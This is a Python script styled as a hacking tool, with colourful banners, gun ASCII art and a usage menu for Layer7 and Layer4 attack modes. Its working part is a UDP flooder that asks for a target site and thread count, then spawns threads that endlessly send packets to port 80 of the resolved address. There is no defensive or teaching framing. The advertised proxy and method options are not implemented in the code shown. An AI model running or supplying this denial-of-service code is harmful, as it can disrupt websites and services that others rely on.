print('  𝗧𝗔𝗖𝗞𝗟𝗢𝗥𝗜𝗫 ')
print('  𝗔𝗖𝗞𝗟𝗢𝗥𝗜𝗫 𝗛𝗔𝗖𝗞')
print('')
from colorama import Fore,init
init()
print(Fore.BLUE+"  ")
import time

def printLow(Str):
       
       for char in Str:

              print(char, end="", flush=True) 

              time.sleep(.01)

printLow(f"""

 ##        ####    #####    ######   ##   ##
 ##       ##  ##   ##  ##     ##     ##  ##
 ##       ##  ##   ##  ##     ##      ####
 ##       ##  ##   #####      ##      ####
 ##       ##  ##   ## ##      ##     ##  ##
 ######    ####    ##  ##   ######   ##  ##
""")




from colorama import Fore,init
init()
print(Fore.LIGHTMAGENTA_EX+" ")



print(Fore.GREEN+"""
⠀⠀⠀⠀⠀⢀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⣀⣤⣤
⠀⠀⢶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠠⠾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠛⠛⠛⠛⠛⠛⠋⠉⠀
⠀⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⠏⢠⣿⡀⠀⠀⢹⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣦⣀⣀⣙⣂⣠⠼⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢠⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢸⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢸⣿⣿⣿⣿⣿⣿⣿⡅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠛⠛⠛⠛⠻⠿⠛⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀


""")
print(Fore.LIGHTCYAN_EX+"""
   [+]════════════════════════════[+]
   [+] Layer7 :
   [+] dmap.py <method> <url> <time> <thread> <rpc> <proxy>
   [+] <proxy> : (1) http - (2) socks4 - (3) socks5
   [+] <proxy> : (4) Use all - (0) Not use
   [+]════════════════════════════[+]
   [+] Layer4 :
   [+] dmap.py <method> <ip> <port> <time> <thread>
   [+] <port> : (0) random port
   [+]════════════════════════════[+]

""")
from colorama import Fore,init
init()
print(Fore.LIGHTRED_EX+"  ")
print('')
import time
import socket
import sys
import _thread
site = input("Enter your site url => ")
thread_count = input("Enter your thread => ")
ip = socket.gethostbyname(site)
UDP_PORT = 80
MESSAGE = 'virus32'
print("UDP target IP:", ip)
print("UDP target port:", UDP_PORT)
time.sleep(3)
def ddos(i):
    while 1:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, UDP_PORT))
        print("Packet Sent")
for i in range(int(thread_count)):
    try:
        _thread.start_new_thread(ddos, ("Thread-" + str(i),))
    except KeyboardInterrupt:
        sys.exit(0)
while 1:
    pass
